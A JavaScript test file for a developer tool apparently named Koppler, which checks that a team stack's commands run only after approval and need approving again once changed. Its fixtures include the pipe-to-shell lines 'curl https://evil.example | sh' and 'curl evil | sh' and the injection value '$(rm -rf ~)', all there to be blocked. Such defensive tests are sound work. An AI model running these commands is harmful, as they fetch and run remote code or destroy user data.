import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
// Approvals go to a throwaway folder, never the real config.
process.env.KOPPLER_CONFIG_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-checks-'));
const { approve, approved, checksFor, fingerprint, runChecks, stackCommands, startsFromStack } = await import('../src/checks.mjs');

const stack = {
  source: '/team/stack.json', install: { cloudflared: 'brew install cloudflared' },
  apps: {
    api: { name: 'API', kind: 'dotnet', prereqs: [{ sso: 'team-qa' }, { tunnel: 'db.internal', port: 5432, what: 'Database', cmd: 'cloudflared access tcp --hostname db.internal --url localhost:5432' }],
      envs: { prod: { prereqs: [{ cmd: 'kubectl port-forward svc/db 5432', what: 'Prod database' }] } } },
    app: { name: 'App', kind: 'flutter' },
  },
  checks: [{ name: 'vpn', run: 'pgrep -x vpnd', ok: 'connected', fix: 'Connect the VPN' }, { name: 'web only', run: 'true', kinds: ['web'] }, { name: 'bad' }],
};
const checks = checksFor(stack), names = checks.map(c => c.name);
// Koppler's own two, each kind's program, and the programs the stack's commands call (every environment); no tool is named by the engine beyond those.
assert.deepEqual(names, ['git', 'node', 'dotnet', 'aws', 'cloudflared', 'kubectl', 'fvm', 'vpn']);
assert.equal(checks.find(c => c.name === 'cloudflared').fix, 'brew install cloudflared');
assert.match(checks.find(c => c.name === 'kubectl').fix, /Install kubectl/);
assert.deepEqual(checks.find(c => c.name === 'aws').for, ['API']);
assert.equal(checks.find(c => c.name === 'vpn').safe, false);
// A program name that is not a plain word is never looked up.
assert.deepEqual(checksFor({ apps: { x: { kind: 'other', prereqs: [{ cmd: '$(rm -rf ~)/x run' }] } } }).map(c => c.name), ['git', 'node']);

// The stack's own commands do not run until approved, and need approving again when one changes.
const ran = [];
const world = { exists: t => t !== 'kubectl', shell: cmd => { ran.push(cmd); return cmd !== 'pgrep -x vpnd'; } };
let results = runChecks(stack, world);
assert.equal(results.find(r => r.name === 'vpn').state, 'pending');
assert.deepEqual(ran, []);
assert.deepEqual(results.filter(r => r.state === 'missing').map(r => r.name), ['kubectl']);
assert.equal(approved(stack.source, stack), false);
approve(stack.source, stack);
assert.equal(approved(stack.source, stack), true);
results = runChecks(stack, world);
assert.deepEqual(ran, ['pgrep -x vpnd']);
assert.deepEqual(results.find(r => r.name === 'vpn'), { name: 'vpn', from: 'stack', state: 'missing', detail: 'Connect the VPN' });
const changed = { ...stack, checks: [{ name: 'vpn', run: 'curl https://evil.example | sh' }] };
assert.notEqual(fingerprint(stackCommands(changed)), fingerprint(stackCommands(stack)));
assert.equal(runChecks(changed, world).find(r => r.name === 'vpn').state, 'pending');
assert.equal(ran.length, 1, 'a changed command is not run before it is approved again');
// A stack with no checks of its own has nothing to approve.
assert.equal(approved('/other', { apps: {} }), true);

// Everything the stack would run or write is one list, approved as a whole: checks, start commands (per app, per
// environment, per kind it defines) and remembered code changes. Any change to it needs approving again.
{
  const s1 = { source: '/s1', envs: ['qa', 'prod'], kinds: { deno: { label: 'Deno', start: 'deno task dev' } },
    apps: { api: { name: 'API', kind: 'other', start: 'make run', envs: { prod: { start: 'make run-prod' } }, localChanges: [{ file: 'a.cs', find: 'x', replace: 'y' }] }, web: { name: 'Web', kind: 'node' }, d: { name: 'D', kind: 'deno' } } };
  assert.deepEqual(stackCommands(s1).map(c => `${c.what}: ${c.name}`), ['start of every: deno app', 'start: API', 'start on prod: API', 'code change: API, a.cs']);
  assert.deepEqual(['api', 'web', 'd'].map(id => startsFromStack(s1, id, 'qa')), [true, false, true]);
  assert.equal(approved(s1.source, s1), false);
  approve(s1.source, s1);
  assert.equal(approved(s1.source, s1), true);
  for (const edit of [a => { a.api.start = 'curl evil | sh'; }, a => { a.api.envs.prod.start = 'x'; }, a => { a.api.localChanges[0].replace = 'z'; }]) {
    const next = JSON.parse(JSON.stringify(s1)); edit(next.apps);
    assert.equal(approved(s1.source, next), false, 'a changed command needs approving again');
  }
}

// Gaps per environment: a tunnel or a secret's steps the first environment has and another does not.
{
  const { envGaps, missingTunnels } = await import('../src/checks.mjs');
  const reg = { envs: ['qa', 'prod'], apps: {
    w: { name: 'Wallet', prereqs: [{ tunnel: 'db-dev', port: 5432, what: 'Database' }, { sso: 'dev-ops' }], secrets: [{ env: 'DB', fetch: { cli: 'x' } }] },
    m: { name: 'Mobile', prereqs: [{ tunnel: 'cache-dev', port: 6379 }], envs: { prod: { prereqs: [{ tunnel: 'cache-prod', port: 6379 }] } } },
    j: { name: 'CRM', outside: 'Salesforce', prereqs: [{ tunnel: 'x', port: 1 }] },
    p: { name: 'Plain' },
  } };
  assert.deepEqual(envGaps(reg).map(g => `${g.app}:${g.kind}`), ['w:tunnel', 'w:sign-in', 'w:secret']);
  assert.deepEqual(missingTunnels(reg, 'prod'), ['w']);
  assert.deepEqual(missingTunnels(reg, 'qa'), []);
  // An own list that drops a kind the first environment has still leaves that kind missing.
  reg.apps.w.envs = { prod: { prereqs: [{ tunnel: 'db-prod', port: 5432 }], secrets: [{ env: 'DB', fetch: { cli: 'y' } }] } };
  assert.deepEqual(envGaps(reg).map(g => `${g.app}:${g.kind}`), ['w:sign-in']);
  reg.apps.w.envs.prod.prereqs.push({ sso: 'prod-ops' });
  assert.deepEqual(envGaps(reg), []);
}
